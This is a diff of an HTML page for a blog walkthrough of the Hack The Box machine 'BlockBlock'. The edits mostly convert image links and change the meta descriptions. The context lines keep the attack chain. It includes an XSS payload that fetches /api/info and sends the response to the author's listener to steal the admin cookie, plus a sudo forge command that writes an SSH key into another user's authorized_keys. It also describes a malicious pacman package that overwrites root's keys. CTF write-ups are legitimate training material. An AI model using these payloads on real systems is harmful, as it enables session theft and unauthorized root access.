@@ -11,7 +11,7 @@
   <title>BlockBlock Walkthrough(Hack The Box) &middot; Secure The Throne</title>
   <meta name="title" content="BlockBlock Walkthrough(Hack The Box) &middot; Secure The Throne" />
   
-  <meta name="description" content="a description" />
+  <meta name="description" content="Awesome Walkthrough" />
   <meta name="keywords" content="Hard, Linux, Hack The Box, hacking, Web3, BLock Chain, Walkthrough, " />
   
   
@@ -72,7 +72,7 @@
   <meta property="og:url" content="http://localhost:1313/posts/1743038151313-blockblock-walkthroughhack-the-box/">
   <meta property="og:site_name" content="Secure The Throne">
   <meta property="og:title" content="BlockBlock Walkthrough(Hack The Box)">
-  <meta property="og:description" content="a description">
+  <meta property="og:description" content="Awesome Walkthrough">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -90,7 +90,7 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/posts/1743038151313-blockblock-walkthroughhack-the-box/featured.png">
   <meta name="twitter:title" content="BlockBlock Walkthrough(Hack The Box)">
-  <meta name="twitter:description" content="a description">
+  <meta name="twitter:description" content="Awesome Walkthrough">
 
   
   <script type="application/ld+json">
@@ -100,7 +100,7 @@
     "articleSection": "Posts",
     "name": "BlockBlock Walkthrough(Hack The Box)",
     "headline": "BlockBlock Walkthrough(Hack The Box)",
-    "description": "a description",
+    "description": "Awesome Walkthrough",
     
     "inLanguage": "en",
     "url" : "http:\/\/localhost:1313\/posts\/1743038151313-blockblock-walkthroughhack-the-box\/",
@@ -117,7 +117,7 @@
     "keywords": ["Hard","Linux","Hack The Box","hacking","Web3","BLock Chain","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "877"
+    "wordCount": "816"
   }]
   </script>
 
@@ -678,7 +678,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-27T00:00:00&#43;00:00">27 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>877 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-27T00:00:00&#43;00:00">27 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>816 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -953,7 +953,7 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance-linux">Reconnaissance #Linux</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
     <li><a href="#enumeration">Enumeration</a></li>
     <li><a href="#exploitation">Exploitation</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
@@ -970,7 +970,7 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance-linux">Reconnaissance #Linux</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
     <li><a href="#enumeration">Enumeration</a></li>
     <li><a href="#exploitation">Exploitation</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
@@ -1057,30 +1057,49 @@
         <div class="article-content max-w-prose mb-20">
           
 
-<h2 class="relative group">Reconnaissance #Linux 
-    <div id="reconnaissance-linux" class="anchor"></div>
+<h2 class="relative group">Reconnaissance 
+    <div id="reconnaissance" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reconnaissance-linux" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#reconnaissance" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <ul>
 <li>Got two ports open 80 and ssh</li>
-<li></li>
-<li>First impression of the web is, It is a Web3 and a chat app</li>
-<li>![[Pasted image 20250106030842.png]]</li>
-<li>The page using Ethereum</li>
-<li>![[Pasted image 20250105224629.png]]</li>
+<li>First impression of the web is, It is a Web3 and a chat app
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106030842.png" />
+      
+    </figure>
+</li>
+<li>The page using Ethereum
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250105224629.png" />
+      
+    </figure>
+</li>
 <li>Interesting isn&rsquo;t it, Created a account and logged in</li>
-<li>Has a secure and cool place to chat</li>
-<li>![[Pasted image 20250106000441.png]]</li>
+<li>Has a secure and cool place to chat
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106000441.png" />
+      
+    </figure>
+</li>
 <li>The chats data are stored using Ethereum in Blocks</li>
 <li>Scooped around a little bit and found <code>/admin</code> page but with no access for us</li>
-<li>The &ldquo;Report User&rdquo; button seems little suspicious cause the website is well built but not the report button</li>
-<li>![[Pasted image 20250106000810.png]]</li>
+<li>The &ldquo;Report User&rdquo; button seems little suspicious cause the website is well built but not the report button
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106000810.png" />
+      
+    </figure>
+</li>
 </ul>
 
 
@@ -1102,19 +1121,39 @@
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="s2">&#34;fetch(&#39;http://10.10.11.43/api/info&#39;).then(response =&gt; {return response.text();}).then(dataFromA =&gt; {return fetch(`http://10.10.14.12:8000/?d=${dataFromA}`)})&#34;</span><span class="o">&gt;</span>
 </span></span></code></pre></div><ul>
-<li>This payload fetches data from the request to the <code>/api/info</code> and returns it to my server</li>
-<li>![[Pasted image 20250106001445.png]]</li>
+<li>This payload fetches data from the request to the <code>/api/info</code> and returns it to my server
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106001445.png" />
+      
+    </figure>
+</li>
 <li>Got the admin cookie and accessed the <code>/admin</code> page.</li>
-<li>In the Source of admin page found interesting endpoints</li>
-<li>![[Pasted image 20250106001604.png]]</li>
+<li>In the Source of admin page found interesting endpoints
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106001604.png" />
+      
+    </figure>
+</li>
 <li>This <code>json-rpc</code> endpoint can query more stuff</li>
 <li>This <a href="https://ethereum.org/en/developers/docs/apis/json-rpc/" target="_blank">Documentation</a> has more info about the stuffs that can be done with this endpoint</li>
-<li>But particularly this one catches my attention</li>
-<li>![[Pasted image 20250106002345.png]]</li>
+<li>But particularly this one catches my attention
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106002345.png" />
+      
+    </figure>
+</li>
 <li>This parameter <code>eth_blockNumber</code> gets the recent block that saved have been saved.</li>
 <li>I tested the endpoint <code>json-rpc</code> with this <code>eth_blockNumber</code></li>
-<li>Seems the value next to the <code>params</code> value is a boolean</li>
-<li>![[Pasted image 20250106002939.png]]</li>
+<li>Seems the value next to the <code>params</code> value is a boolean
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106002939.png" />
+      
+    </figure>
+</li>
 <li>The <code>Params</code> value is the the value for the block.</li>
 <li>This request data&rsquo;s response seemed interesting</li>
 <li><strong>Request</strong></li>
@@ -1145,12 +1184,27 @@
 </ul>
 <pre tabindex="0"><code>&#34;params&#34;:[&#34;0xi&#34;,true]
 </code></pre><ul>
-<li>Likewise got a <code>input</code> value</li>
-<li>![[Pasted image 20250106003937.png]]</li>
-<li>After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it using with the help of Cyberchef and got password and username from it.</li>
-<li>![[Pasted image 20250106004230.png]]</li>
-<li>So logged in using SSH and got the user flag</li>
-<li>![[Pasted image 20250106004313.png]]</li>
+<li>Likewise got a <code>input</code> value
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106003937.png" />
+      
+    </figure>
+</li>
+<li>After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it using with the help of Cyberchef and got password and username from it.
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106004230.png" />
+      
+    </figure>
+</li>
+<li>So logged in using SSH and got the user flag
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106004313.png" />
+      
+    </figure>
+</li>
 </ul>
 
 
@@ -1165,8 +1219,13 @@
     
 </h2>
 <ul>
-<li>It seems the user keira can run sudo a user paul with a binary</li>
-<li>![[Pasted image 20250106004658.png]]</li>
+<li>It seems the user keira can run sudo a user paul with a binary
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106004658.png" />
+      
+    </figure>
+</li>
 <li><code>forge</code> is the command-line interface (CLI) tool for interacting with a specific framework or environment. It could relate to tools like <code>Foundry</code> for Ethereum development or any other CLI-based tool with the name <code>forge</code></li>
 <li>After hours of research found that we can use <code>flatten</code> option using forge to write something .</li>
 <li>When someone login in SSH using private key, SSH checks the authenticity of the key with its public key on the system.</li>
@@ -1178,8 +1237,13 @@
 </li>
 </ul>
 <pre tabindex="0"><code>ssh-keygen
-</code></pre><ul>
-<li>![[Pasted image 20250107181255.png]]</li>
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107181255.png" />
+      
+    </figure>
+</p>
+<ul>
 <li><strong>Step-2</strong>
 <ul>
 <li>Copy the public key of user <code>keira</code> to the <code>/tmp</code> folder and Give all necessary permissions.</li>
@@ -1188,22 +1252,42 @@
 </ul>
 <pre tabindex="0"><code>cp .ssh/id_ed25519.pub /tmp/pub
 </code></pre><pre tabindex="0"><code>chmod 644 /tmp/pub
-</code></pre><p>![[Pasted image 20250107183317.png]]</p>
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107183317.png" />
+      
+    </figure>
+</p>
 <ul>
 <li><strong>Step-3</strong></li>
 <li>Exploit using the <code>flatten</code> option to write the public to the user <code>paul</code>&rsquo;s home directory in the <code>.ssh/authorized_keys</code> file</li>
 </ul>
-<pre tabindex="0"><code>sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys
-</code></pre><p>![[Pasted image 20250107183403.png]]</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107183403.png" />
+      
+    </figure>
+</p>
 <ul>
 <li><strong>Step-4</strong></li>
 <li>Now share the private key to the host system and login using the private key as user <code>paul</code></li>
 </ul>
-<pre tabindex="0"><code>python3 -m http.server --directory .ssh/
-</code></pre><ul>
-<li>![[Pasted image 20250107183432.png]]</li>
-<li>Got access as user <code>paul</code></li>
-<li>![[Pasted image 20250107183526.png]]</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server --directory .ssh/
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107183432.png" />
+      
+    </figure>
+</p>
+<ul>
+<li>Got access as user <code>paul</code>
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107183526.png" />
+      
+    </figure>
+</li>
 <li>As we can see user <code>paul</code> has SUDO privilege to run <code>pacman</code></li>
 <li>To exploit this, create a own malicious package and install it using pacman.</li>
 <li>Initially I was struggling cause of my malicious package not working as intended.</li>
@@ -1248,13 +1332,28 @@
 <li>This script is quite simple, the script first makes a directory named <code>priv</code> then creates a file named <code>PKGBUILD</code> with malicious code.</li>
 <li>The malicious code will replace the <code>root</code> user&rsquo;s <code>authorized_keys</code> file with our public key</li>
 <li>Script also creates the ssh keys of our system in the current directory with no password and then it renamed the public key name to <code>authorized_keys</code></li>
-<li>It executes this command <code>makepkg</code>. Which will compile the malicious  package with our public key <code>authorized_keys</code></li>
-<li>![[Pasted image 20250107185332.png]]</li>
-<li>Transfer this malicious package to the target system and install it using <code>sudo</code></li>
-<li>![[Pasted image 20250107185451.png]]</li>
+<li>It executes this command <code>makepkg</code>. Which will compile the malicious  package with our public key <code>authorized_keys</code>
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107185332.png" />
+      
+    </figure>
+</li>
+<li>Transfer this malicious package to the target system and install it using <code>sudo</code>
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107185451.png" />
+      
+    </figure>
+</li>
 <li>On the host system give all the necessary permissions to our private key and use it to login</li>
-<li>System rooted successfully.</li>
-<li>![[Pasted image 20250107185638.png]]</li>
+<li>System rooted successfully.
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107185638.png" />
+      
+    </figure>
+</li>
 </ul>
 
           
